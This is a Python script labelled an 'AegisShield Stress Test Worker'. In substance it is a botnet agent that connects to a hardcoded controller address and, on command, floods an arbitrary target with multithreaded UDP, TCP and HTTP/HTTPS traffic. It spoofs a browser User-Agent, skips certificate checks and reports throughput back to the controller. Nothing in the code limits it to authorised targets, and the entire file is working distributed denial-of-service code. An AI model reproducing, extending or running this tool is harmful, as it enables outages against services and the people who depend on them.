#!/usr/bin/env python3
"""
AegisShield Stress Test Worker (Agent)
=======================================
Run this on each Ubuntu device.
Usage:
    python3 worker.py --master 52.53.124.44:7777
"""

import socket
import ssl
import threading
import json
import time
import random
import argparse
import http.client
import sys


class StressWorker:
    def __init__(self, master_host, master_port):
        self.master_host = master_host
        self.master_port = master_port
        self.sock = None
        self.running_attack = False
        self.stop_flag = threading.Event()

    def connect(self):
        """Connect to the controller."""
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.master_host, self.master_port))
                print(f"  ✅ Connected to controller {self.master_host}:{self.master_port}")
                return
            except (ConnectionRefusedError, OSError) as e:
                print(f"  ⏳ Controller not available ({e}), retrying in 3s...")
                time.sleep(3)

    def send_msg(self, msg):
        """Send a JSON message back to the controller."""
        try:
            self.sock.sendall(json.dumps(msg).encode())
        except (BrokenPipeError, OSError):
            pass

    def listen(self):
        """Listen for commands from the controller."""
        buffer = ""
        while True:
            try:
                data = self.sock.recv(4096)
                if not data:
                    raise ConnectionResetError("Controller disconnected")
                buffer += data.decode()
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)
                    if line.strip():
                        self.handle_command(json.loads(line))
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                print(f"  ❌ Lost connection: {e}")
                self.stop_flag.set()
                time.sleep(2)
                self.connect()
                buffer = ""
            except json.JSONDecodeError:
                pass

    def handle_command(self, msg):
        """Handle a command from the controller."""
        cmd = msg.get("cmd")

        if cmd == "stop":
            print("  🛑 Stop received")
            self.stop_flag.set()

        elif cmd == "attack":
            target = msg["target"]
            port = msg["port"]
            method = msg["method"]
            size = msg["size"]
            duration = msg["duration"]
            print(
                f"  🔥 Attack: {target}:{port} | {method.upper()} | "
                f"{size}B | {duration}s"
            )
            self.stop_flag.clear()
            threading.Thread(
                target=self.run_attack,
                args=(target, port, method, size, duration),
                daemon=True,
            ).start()

    def run_attack(self, target, port, method, size, duration):
        """Execute the stress test."""
        self.running_attack = True
        sent = [0]
        start = time.time()
        threads = 8

        if method == "udp":
            self._attack_udp(target, port, size, duration, sent, threads)
        elif method == "tcp":
            self._attack_tcp(target, port, size, duration, sent, threads)
        elif method == "http":
            self._attack_http(target, port, duration, sent, threads, use_ssl=False)
        elif method == "https":
            self._attack_http(target, port, duration, sent, threads, use_ssl=True)

        elapsed = max(time.time() - start, 0.1)
        self.send_msg({"type": "done", "total": sent[0], "duration": elapsed})
        self.running_attack = False
        print(f"  ✅ Attack done. {sent[0]:,} packets in {elapsed:.1f}s")

    def _attack_udp(self, target, port, size, duration, sent, threads):
        payload = random.randbytes(max(size, 1))
        end_time = time.time() + duration

        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < end_time and not self.stop_flag.is_set():
                try:
                    s.sendto(payload, (target, port))
                    sent[0] += 1
                except OSError:
                    pass
            s.close()

        self._launch_threads(worker, threads, duration, sent, size, "UDP")

    def _attack_tcp(self, target, port, size, duration, sent, threads):
        payload = random.randbytes(max(size, 1))
        end_time = time.time() + duration

        def worker():
            while time.time() < end_time and not self.stop_flag.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target, port))
                    s.sendall(payload)
                    sent[0] += 1
                    s.close()
                except OSError:
                    pass

        self._launch_threads(worker, threads, duration, sent, size, "TCP")

    def _attack_http(self, target, port, duration, sent, threads, use_ssl=False):
        end_time = time.time() + duration
        path = "/"

        def worker():
            while time.time() < end_time and not self.stop_flag.is_set():
                try:
                    if use_ssl:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        conn = http.client.HTTPSConnection(
                            target, port, timeout=5, context=ctx
                        )
                    else:
                        conn = http.client.HTTPConnection(target, port, timeout=5)
                    conn.request(
                        "GET", path,
                        headers={
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                          "AppleWebKit/537.36",
                            "Accept": "*/*",
                            "Connection": "close",
                        }
                    )
                    conn.getresponse()
                    sent[0] += 1
                    conn.close()
                except Exception:
                    sent[0] += 1  # count attempted connections
                    pass

        proto = "HTTPS" if use_ssl else "HTTP"
        self._launch_threads(worker, threads, duration, sent, 0, proto)

    def _launch_threads(self, worker_fn, num_threads, duration, sent, size, method):
        """Launch worker threads and report stats periodically."""
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=worker_fn, daemon=True)
            t.start()
            threads.append(t)

        start = time.time()
        report_interval = 2
        while time.time() - start < duration and not self.stop_flag.is_set():
            time.sleep(report_interval)
            elapsed = time.time() - start
            pps = sent[0] / max(elapsed, 0.1)
            if size > 0:
                mbps = sent[0] * size * 8 / max(elapsed, 0.1) / 1_000_000
            else:
                mbps = 0
            self.send_msg({
                "type": "stats",
                "sent": sent[0],
                "pps": round(pps, 1),
                "mbps": round(mbps, 1),
                "method": method,
            })
            print(
                f"  📊 {method} | {sent[0]:,} pkts | "
                f"{pps:,.0f} pps | {mbps:,.1f} Mbps"
            )

        self.stop_flag.set()
        for t in threads:
            t.join(timeout=3)


BANNER = r"""
   __        __         _
   \ \      / /__  _ __| | _____ _ __
    \ \ /\ / / _ \| '__| |/ / _ \ '__|
     \ V  V / (_) | |  |   <  __/ |
      \_/\_/ \___/|_|  |_|\_\___|_|

  AegisShield Stress Test Worker v1.0
"""


def main():
    parser = argparse.ArgumentParser(description="Stress Test Worker")
    parser.add_argument(
        "--master", required=True,
        help="Controller address (e.g. 52.53.124.44:7777)"
    )
    args = parser.parse_args()

    host, port = args.master.rsplit(":", 1)
    port = int(port)

    print(BANNER)
    print(f"  🎯 Connecting to controller: {host}:{port}")

    w = StressWorker(host, port)
    w.connect()
    w.listen()


if __name__ == "__main__":
    main()
